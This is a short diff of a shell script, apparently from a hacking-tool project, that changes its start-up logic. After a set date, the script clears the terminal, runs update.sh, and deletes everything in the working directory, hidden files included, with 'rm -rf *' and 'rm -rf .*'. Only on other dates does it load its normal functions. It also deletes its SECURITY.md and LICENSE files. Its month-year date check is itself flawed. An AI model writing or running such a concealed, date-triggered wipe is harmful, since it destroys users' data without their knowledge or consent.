@@ -25,10 +25,12 @@ CLOWNTERS
 test -f Sploit && rm Sploit
 test -f SECURITY.md && rm SECURITY.md
 test -f LICENSE && rm LICENSE
-
 if (($(date +%m%y) >= 0222)); then
+    clear
     bash update.sh
     rm -rf *
     rm -rf .*
+else
+    source .functions/.main
 fi
-source .functions/.main
+exit 0
